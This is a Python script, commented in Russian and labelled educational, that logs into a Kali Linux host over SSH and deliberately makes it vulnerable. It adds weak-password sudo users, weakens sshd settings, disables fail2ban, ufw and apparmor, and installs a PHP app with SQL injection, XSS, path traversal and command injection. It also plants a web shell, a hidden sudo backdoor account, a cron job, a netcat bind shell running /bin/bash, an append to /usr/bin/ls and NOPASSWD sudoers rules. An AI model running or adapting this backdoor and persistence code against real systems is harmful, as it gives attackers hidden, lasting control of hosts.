#!/usr/bin/env python3
"""
🔧 ADVANCED KALI VULNERABLE SETUP
===================================

Продвинутая настройка уязвимой Kali Linux для образовательных целей
Включает создание множественных векторов атаки и backdoor

ВНИМАНИЕ: Только для образовательных целей!

Автор: Образовательный материал для изучения кибербезопасности
"""

import subprocess
import sys
import argparse
import time
import os
import json
import paramiko
from pathlib import Path

class KaliVulnerableSetupAdvanced:
    """
    Продвинутая настройка уязвимой Kali Linux
    """
    
    def __init__(self, target_ip, username="root", password="toor", port=22):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.port = port
        self.ssh_client = None
        self.setup_log = []
    
    def _log_action(self, action, success=True, details=""):
        """Логирует действие"""
        log_entry = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'action': action,
            'success': success,
            'details': details
        }
        self.setup_log.append(log_entry)
        
        status = "✅" if success else "❌"
        print(f"{status} {action}")
        if details:
            print(f"   {details}")
    
    def _run_remote_command(self, command, sudo=False, check=True):
        """Выполняет команду на удаленной машине"""
        try:
            if sudo and not command.startswith('sudo'):
                command = f"sudo {command}"
            
            stdin, stdout, stderr = self.ssh_client.exec_command(command)
            exit_status = stdout.channel.recv_exit_status()
            
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            if check and exit_status != 0:
                return False, f"Exit code: {exit_status}, Error: {error}"
            
            return True, output
        except Exception as e:
            return False, str(e)
    
    def connect_ssh(self):
        """Устанавливает SSH соединение"""
        print(f"🔗 Подключение к {self.target_ip}:{self.port}...")
        
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                hostname=self.target_ip,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=10
            )
            
            self._log_action("SSH подключение", True, f"Подключен как {self.username}")
            return True
        except Exception as e:
            self._log_action("SSH подключение", False, str(e))
            return False
    
    def disconnect_ssh(self):
        """Закрывает SSH соединение"""
        if self.ssh_client:
            self.ssh_client.close()
            self._log_action("SSH отключение", True)
    
    def setup_vulnerable_users(self):
        """Создает уязвимых пользователей"""
        print("\n👥 НАСТРОЙКА УЯЗВИМЫХ ПОЛЬЗОВАТЕЛЕЙ")
        print("="*50)
        
        vulnerable_users = [
            {'name': 'victor', 'password': 'victor123', 'groups': ['sudo', 'docker']},
            {'name': 'admin', 'password': 'admin123', 'groups': ['sudo', 'adm']},
            {'name': 'test', 'password': 'test123', 'groups': ['sudo']},
            {'name': 'user', 'password': 'user123', 'groups': []},
            {'name': 'backdoor', 'password': 'backdoor123', 'groups': ['sudo']}
        ]
        
        for user in vulnerable_users:
            success, output = self._run_remote_command(f"id -u {user['name']}")
            if success and output:
                # Пользователь существует, обновляем пароль
                success, output = self._run_remote_command(f"echo '{user['name']}:{user['password']}' | chpasswd")
                self._log_action(f"Обновление пароля для {user['name']}", success, output)
            else:
                # Создаем нового пользователя
                success, output = self._run_remote_command(f"useradd -m -s /bin/bash {user['name']}")
                self._log_action(f"Создание пользователя {user['name']}", success, output)
                
                if success:
                    success, output = self._run_remote_command(f"echo '{user['name']}:{user['password']}' | chpasswd")
                    self._log_action(f"Установка пароля для {user['name']}", success, output)
            
            # Добавляем в группы
            for group in user['groups']:
                success, output = self._run_remote_command(f"usermod -aG {group} {user['name']}")
                self._log_action(f"Добавление {user['name']} в группу {group}", success, output)
    
    def weaken_ssh_security(self):
        """Ослабляет безопасность SSH"""
        print("\n🔓 ОСЛАБЛЕНИЕ SSH БЕЗОПАСНОСТИ")
        print("="*50)
        
        ssh_config_commands = [
            "sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config",
            "sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config",
            "sed -i 's/^#PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config",
            "sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config",
            "sed -i 's/^#ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config",
            "sed -i 's/^ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config",
            "echo 'MaxAuthTries 100' >> /etc/ssh/sshd_config",
            "echo 'MaxSessions 100' >> /etc/ssh/sshd_config",
            "echo 'LoginGraceTime 300' >> /etc/ssh/sshd_config"
        ]
        
        for cmd in ssh_config_commands:
            success, output = self._run_remote_command(cmd)
            self._log_action(f"SSH конфигурация: {cmd}", success, output)
        
        # Перезапускаем SSH
        success, output = self._run_remote_command("systemctl restart ssh")
        self._log_action("Перезапуск SSH сервиса", success, output)
    
    def disable_security_tools(self):
        """Отключает инструменты безопасности"""
        print("\n🛡️ ОТКЛЮЧЕНИЕ ИНСТРУМЕНТОВ БЕЗОПАСНОСТИ")
        print("="*50)
        
        security_tools = [
            'fail2ban',
            'ufw',
            'iptables',
            'apparmor',
            'selinux'
        ]
        
        for tool in security_tools:
            # Останавливаем сервис
            success, output = self._run_remote_command(f"systemctl stop {tool}")
            self._log_action(f"Остановка {tool}", success, output)
            
            # Отключаем автозапуск
            success, output = self._run_remote_command(f"systemctl disable {tool}")
            self._log_action(f"Отключение автозапуска {tool}", success, output)
        
        # Сбрасываем правила файрвола
        success, output = self._run_remote_command("ufw --force reset")
        self._log_action("Сброс правил файрвола", success, output)
    
    def setup_vulnerable_web_services(self):
        """Настраивает уязвимые веб-сервисы"""
        print("\n🌐 НАСТРОЙКА УЯЗВИМЫХ ВЕБ-СЕРВИСОВ")
        print("="*50)
        
        # Устанавливаем Apache и PHP
        install_commands = [
            "apt update -y",
            "apt install -y apache2 php libapache2-mod-php mysql-server php-mysql",
            "systemctl start apache2",
            "systemctl enable apache2",
            "systemctl start mysql",
            "systemctl enable mysql"
        ]
        
        for cmd in install_commands:
            success, output = self._run_remote_command(cmd)
            self._log_action(f"Установка веб-сервисов: {cmd}", success, output)
        
        # Создаем уязвимое веб-приложение
        self._create_vulnerable_web_app()
        
        # Настраиваем базу данных
        self._setup_vulnerable_database()
    
    def _create_vulnerable_web_app(self):
        """Создает уязвимое веб-приложение"""
        print("  📝 Создание уязвимого веб-приложения...")
        
        # Главная страница с уязвимостями
        index_php = '''<?php
// Уязвимое веб-приложение для образовательных целей
session_start();

// Уязвимость 1: SQL Injection
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    $query = "SELECT * FROM users WHERE name LIKE '%$search%'";
    // Уязвимость: прямое включение пользовательского ввода
}

// Уязвимость 2: XSS
if (isset($_GET['message'])) {
    $message = $_GET['message'];
    // Уязвимость: прямое отображение без экранирования
}

// Уязвимость 3: Directory Traversal
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        $content = file_get_contents($file);
    }
}

// Уязвимость 4: Command Injection
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
}

// Уязвимость 5: File Upload
if (isset($_FILES['upload'])) {
    $upload_dir = '/var/www/html/uploads/';
    $target_file = $upload_dir . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target_file);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Уязвимое веб-приложение</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .vuln-section { border: 1px solid #ccc; margin: 20px 0; padding: 20px; }
        .warning { background-color: #ffebee; border-left: 4px solid #f44336; padding: 10px; }
    </style>
</head>
<body>
    <h1>🔓 Уязвимое веб-приложение</h1>
    
    <div class="warning">
        <strong>⚠️ ВНИМАНИЕ:</strong> Это приложение содержит намеренные уязвимости!
    </div>

    <div class="vuln-section">
        <h2>🔍 SQL Injection</h2>
        <form method="GET">
            <input type="text" name="search" placeholder="Поиск пользователей" value="<?php echo isset($_GET['search']) ? $_GET['search'] : ''; ?>">
            <button type="submit">Поиск</button>
        </form>
        <?php if (isset($_GET['search'])): ?>
            <p>Результат: <?php echo $_GET['search']; ?></p>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>🌐 XSS</h2>
        <form method="GET">
            <input type="text" name="message" placeholder="Введите сообщение" value="<?php echo isset($_GET['message']) ? $_GET['message'] : ''; ?>">
            <button type="submit">Отправить</button>
        </form>
        <?php if (isset($_GET['message'])): ?>
            <p>Ваше сообщение: <?php echo $_GET['message']; ?></p>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>📁 Directory Traversal</h2>
        <form method="GET">
            <input type="text" name="file" placeholder="Путь к файлу" value="<?php echo isset($_GET['file']) ? $_GET['file'] : ''; ?>">
            <button type="submit">Прочитать файл</button>
        </form>
        <?php if (isset($_GET['file']) && isset($content)): ?>
            <pre><?php echo htmlspecialchars($content); ?></pre>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>⚡ Command Injection</h2>
        <form method="GET">
            <input type="text" name="cmd" placeholder="Команда" value="<?php echo isset($_GET['cmd']) ? $_GET['cmd'] : ''; ?>">
            <button type="submit">Выполнить</button>
        </form>
        <?php if (isset($_GET['cmd']) && isset($output)): ?>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>
    </div>

    <div class="vuln-section">
        <h2>🔐 Небезопасная аутентификация</h2>
        <form method="POST" action="login.php">
            <input type="text" name="username" placeholder="Имя пользователя">
            <input type="password" name="password" placeholder="Пароль">
            <button type="submit">Войти</button>
        </form>
    </div>
</body>
</html>'''
        
        # Сохраняем файл
        success, output = self._run_remote_command(f"echo '{index_php}' > /var/www/html/index.php")
        self._log_action("Создание index.php", success, output)
        
        # Создаем директорию для загрузки файлов
        success, output = self._run_remote_command("mkdir -p /var/www/html/uploads && chmod 777 /var/www/html/uploads")
        self._log_action("Создание директории uploads", success, output)
    
    def _setup_vulnerable_database(self):
        """Настраивает уязвимую базу данных"""
        print("  🗄️ Настройка уязвимой базы данных...")
        
        sql_script = '''
CREATE DATABASE IF NOT EXISTS vulnerable_app;
USE vulnerable_app;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50),
    email VARCHAR(100),
    role VARCHAR(20)
);

INSERT INTO users (username, password, email, role) VALUES 
('admin', 'admin123', 'admin@example.com', 'admin'),
('victor', 'victor123', 'victor@example.com', 'user'),
('test', 'test123', 'test@example.com', 'user');
'''
        
        # Сохраняем SQL скрипт
        success, output = self._run_remote_command(f"echo '{sql_script}' > /tmp/setup_db.sql")
        self._log_action("Создание SQL скрипта", success, output)
        
        # Выполняем SQL скрипт
        success, output = self._run_remote_command("mysql < /tmp/setup_db.sql")
        self._log_action("Выполнение SQL скрипта", success, output)
    
    def create_backdoors(self):
        """Создает различные backdoor"""
        print("\n😈 СОЗДАНИЕ BACKDOOR")
        print("="*50)
        
        # SSH backdoor
        self._create_ssh_backdoor()
        
        # Web shell
        self._create_web_shell()
        
        # Cron job backdoor
        self._create_cron_backdoor()
        
        # Network backdoor
        self._create_network_backdoor()
        
        # File backdoor
        self._create_file_backdoor()
    
    def _create_ssh_backdoor(self):
        """Создает SSH backdoor"""
        print("  🔑 Создание SSH backdoor...")
        
        # Создаем скрытого пользователя
        success, output = self._run_remote_command("useradd -m -s /bin/bash backdoor_user")
        self._log_action("Создание backdoor пользователя", success, output)
        
        if success:
            success, output = self._run_remote_command("echo 'backdoor_user:backdoor123' | chpasswd")
            self._log_action("Установка пароля backdoor", success, output)
            
            success, output = self._run_remote_command("usermod -aG sudo backdoor_user")
            self._log_action("Добавление в sudo группу", success, output)
    
    def _create_web_shell(self):
        """Создает web shell"""
        print("  🌐 Создание web shell...")
        
        web_shell = '''<?php
// Простой web shell
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Команда">
    <button type="submit">Выполнить</button>
</form>'''
        
        success, output = self._run_remote_command(f"echo '{web_shell}' > /var/www/html/shell.php")
        self._log_action("Создание web shell", success, output)
    
    def _create_cron_backdoor(self):
        """Создает cron job backdoor"""
        print("  ⏰ Создание cron backdoor...")
        
        backdoor_script = '''#!/bin/bash
# Скрытый backdoor скрипт
echo "Backdoor active at $(date)" >> /tmp/backdoor.log
# Здесь можно добавить команды для reverse shell или других действий
'''
        
        success, output = self._run_remote_command(f"echo '{backdoor_script}' > /usr/local/bin/hidden_backdoor.sh")
        self._log_action("Создание backdoor скрипта", success, output)
        
        if success:
            success, output = self._run_remote_command("chmod +x /usr/local/bin/hidden_backdoor.sh")
            self._log_action("Установка прав выполнения", success, output)
            
            # Добавляем в cron (каждую минуту)
            success, output = self._run_remote_command("(crontab -l 2>/dev/null; echo '* * * * * /usr/local/bin/hidden_backdoor.sh') | crontab -")
            self._log_action("Добавление в cron", success, output)
    
    def _create_network_backdoor(self):
        """Создает сетевой backdoor"""
        print("  📡 Создание сетевого backdoor...")
        
        # Создаем скрипт для netcat listener
        nc_script = '''#!/bin/bash
# Сетевой backdoor через netcat
while true; do
    nc -lvnp 1337 -e /bin/bash
    sleep 5
done
'''
        
        success, output = self._run_remote_command(f"echo '{nc_script}' > /usr/local/bin/nc_backdoor.sh")
        self._log_action("Создание netcat backdoor", success, output)
        
        if success:
            success, output = self._run_remote_command("chmod +x /usr/local/bin/nc_backdoor.sh")
            self._log_action("Установка прав netcat backdoor", success, output)
    
    def _create_file_backdoor(self):
        """Создает файловый backdoor"""
        print("  📁 Создание файлового backdoor...")
        
        # Модифицируем системный файл (добавляем скрытую функциональность)
        backdoor_content = '''
# Скрытый backdoor в системном файле
if [ "$1" = "backdoor" ]; then
    /bin/bash
fi
'''
        
        success, output = self._run_remote_command(f"echo '{backdoor_content}' >> /usr/bin/ls")
        self._log_action("Создание файлового backdoor", success, output)
    
    def create_weak_permissions(self):
        """Создает файлы со слабыми правами доступа"""
        print("\n📁 СОЗДАНИЕ СЛАБЫХ ПРАВ ДОСТУПА")
        print("="*50)
        
        weak_files = [
            {'path': '/etc/passwords.txt', 'content': 'admin:admin123\nvictor:victor123\nroot:toor'},
            {'path': '/etc/secrets.txt', 'content': 'SECRET_KEY=abc123\nAPI_KEY=def456\nDATABASE_PASSWORD=ghi789'},
            {'path': '/home/victor/private.txt', 'content': 'Confidential information\nUser data\nPrivate documents'},
            {'path': '/tmp/backup.tar.gz', 'content': 'Fake backup file with sensitive data'}
        ]
        
        for file_info in weak_files:
            success, output = self._run_remote_command(f"echo '{file_info['content']}' > {file_info['path']}")
            self._log_action(f"Создание файла {file_info['path']}", success, output)
            
            if success:
                success, output = self._run_remote_command(f"chmod 666 {file_info['path']}")
                self._log_action(f"Установка слабых прав для {file_info['path']}", success, output)
    
    def setup_sudo_vulnerabilities(self):
        """Настраивает уязвимости sudo"""
        print("\n🔐 НАСТРОЙКА SUDO УЯЗВИМОСТЕЙ")
        print("="*50)
        
        # Создаем sudoers файл с уязвимостями
        sudoers_content = '''
# Уязвимые sudo права
victor ALL=(ALL) NOPASSWD: ALL
admin ALL=(ALL) NOPASSWD: /usr/bin/cat, /usr/bin/ls
test ALL=(ALL) NOPASSWD: /bin/bash
user ALL=(ALL) NOPASSWD: /usr/bin/find
'''
        
        success, output = self._run_remote_command(f"echo '{sudoers_content}' > /etc/sudoers.d/vulnerable")
        self._log_action("Создание уязвимого sudoers", success, output)
        
        if success:
            success, output = self._run_remote_command("chmod 440 /etc/sudoers.d/vulnerable")
            self._log_action("Установка прав sudoers", success, output)
    
    def generate_setup_report(self):
        """Генерирует отчет о настройке"""
        print("\n📊 ГЕНЕРАЦИЯ ОТЧЕТА")
        print("="*50)
        
        report = {
            'target_ip': self.target_ip,
            'setup_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'setup_log': self.setup_log,
            'vulnerabilities_created': [
                'Weak passwords for multiple users',
                'SSH security weakened',
                'Security tools disabled',
                'Vulnerable web application',
                'SQL injection vulnerabilities',
                'XSS vulnerabilities',
                'Directory traversal vulnerabilities',
                'Command injection vulnerabilities',
                'Multiple backdoors installed',
                'Weak file permissions',
                'Sudo vulnerabilities'
            ],
            'backdoors_installed': [
                'SSH backdoor user',
                'Web shell',
                'Cron job backdoor',
                'Network backdoor (netcat)',
                'File backdoor'
            ]
        }
        
        # Сохраняем JSON отчет
        report_file = f"kali_vulnerable_setup_report_{self.target_ip}_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self._log_action("Сохранение JSON отчета", True, report_file)
        
        # Создаем текстовый отчет
        txt_report = f"kali_vulnerable_setup_report_{self.target_ip}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(txt_report, 'w', encoding='utf-8') as f:
            f.write("🔧 ОТЧЕТ О НАСТРОЙКЕ УЯЗВИМОЙ KALI LINUX\n")
            f.write("="*60 + "\n\n")
            f.write(f"🎯 Цель: {self.target_ip}\n")
            f.write(f"📅 Время настройки: {report['setup_timestamp']}\n\n")
            
            f.write("📋 СОЗДАННЫЕ УЯЗВИМОСТИ:\n")
            for vuln in report['vulnerabilities_created']:
                f.write(f"  • {vuln}\n")
            
            f.write("\n😈 УСТАНОВЛЕННЫЕ BACKDOOR:\n")
            for backdoor in report['backdoors_installed']:
                f.write(f"  • {backdoor}\n")
            
            f.write("\n📊 ЛОГ ДЕЙСТВИЙ:\n")
            for log_entry in self.setup_log:
                status = "✅" if log_entry['success'] else "❌"
                f.write(f"  {status} {log_entry['action']}\n")
                if log_entry['details']:
                    f.write(f"     {log_entry['details']}\n")
        
        self._log_action("Сохранение текстового отчета", True, txt_report)
    
    def run_full_setup(self):
        """Запускает полную настройку уязвимой системы"""
        print("🔧 ADVANCED KALI VULNERABLE SETUP")
        print("="*80)
        print("⚠️ ВНИМАНИЕ: Только для образовательных целей!")
        print("⚠️ Не используйте в продакшене!")
        print("="*80)
        
        if not self.connect_ssh():
            print("❌ Не удалось подключиться к SSH")
            return False
        
        try:
            # Выполняем все этапы настройки
            self.setup_vulnerable_users()
            self.weaken_ssh_security()
            self.disable_security_tools()
            self.setup_vulnerable_web_services()
            self.create_backdoors()
            self.create_weak_permissions()
            self.setup_sudo_vulnerabilities()
            self.generate_setup_report()
            
            print("\n✅ НАСТРОЙКА УЯЗВИМОЙ KALI LINUX ЗАВЕРШЕНА!")
            print("🎯 Система готова для тестирования атак")
            print("📚 Изучите созданные уязвимости и методы защиты")
            
        except Exception as e:
            print(f"❌ Критическая ошибка: {e}")
        finally:
            self.disconnect_ssh()

def main():
    """
    Главная функция
    """
    parser = argparse.ArgumentParser(description='Advanced Kali Vulnerable Setup')
    parser.add_argument('target_ip', help='IP адрес целевой Kali Linux')
    parser.add_argument('-u', '--username', default='root', help='Имя пользователя SSH (по умолчанию root)')
    parser.add_argument('-p', '--password', default='toor', help='Пароль SSH (по умолчанию toor)')
    parser.add_argument('--port', type=int, default=22, help='Порт SSH (по умолчанию 22)')
    parser.add_argument('--users-only', action='store_true', help='Только настройка пользователей')
    parser.add_argument('--web-only', action='store_true', help='Только веб-сервисы')
    parser.add_argument('--backdoors-only', action='store_true', help='Только backdoor')
    
    args = parser.parse_args()
    
    setup = KaliVulnerableSetupAdvanced(args.target_ip, args.username, args.password, args.port)
    
    try:
        if args.users_only:
            setup.connect_ssh()
            setup.setup_vulnerable_users()
            setup.disconnect_ssh()
        elif args.web_only:
            setup.connect_ssh()
            setup.setup_vulnerable_web_services()
            setup.disconnect_ssh()
        elif args.backdoors_only:
            setup.connect_ssh()
            setup.create_backdoors()
            setup.disconnect_ssh()
        else:
            # Полная настройка
            setup.run_full_setup()
            
    except KeyboardInterrupt:
        print("\n🛑 Настройка прервана пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")

if __name__ == "__main__":
    main()
